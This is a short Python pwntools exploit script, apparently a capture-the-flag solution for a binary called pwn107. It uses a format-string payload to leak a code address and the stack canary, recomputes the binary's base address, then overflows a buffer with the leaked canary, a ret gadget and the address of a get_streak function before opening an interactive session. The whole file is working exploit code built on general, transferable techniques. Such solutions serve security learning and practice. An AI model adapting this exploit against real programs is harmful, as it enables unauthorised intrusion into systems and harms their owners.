#!/usr/bin/env python

import sys
from pwn import *
from struct import *

exe = './pwn107.pwn107'
binary = context.binary = ELF(exe,checksec=False)
static_libc_address = binary.symbols.__libc_csu_init

def start(argv=[], *a, **kw):
	if args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)
io = start()
io.recvuntil(b"streak?")

#input location = %6$p
#libc location = input+4 = %10$p
#canary location = input+7 = %13$p
payload = b""
payload += b"%10$p.%13$p" #here we leak 

io.sendline(payload)

io.recvuntil(b"streak:")

output = io.recv().split(b"\n")[0]

dynamic_libc_address = int(output.split(b".")[0].strip(), 16)
canary = int(output.split(b".")[1].strip(), 16)

dynamic_base_address = dynamic_libc_address-static_libc_address
binary.address = dynamic_base_address

dynamic_get_streak = binary.symbols.get_streak
rop = ROP(binary)
ret_gadget = rop.find_gadget(['ret'])[0]

payload = b""
payload += b"\x90" * 0x18+ p64(canary) + b"\x90"*8 + p64(ret_gadget) + p64(dynamic_get_streak)
io.sendline(payload)
io.interactive()
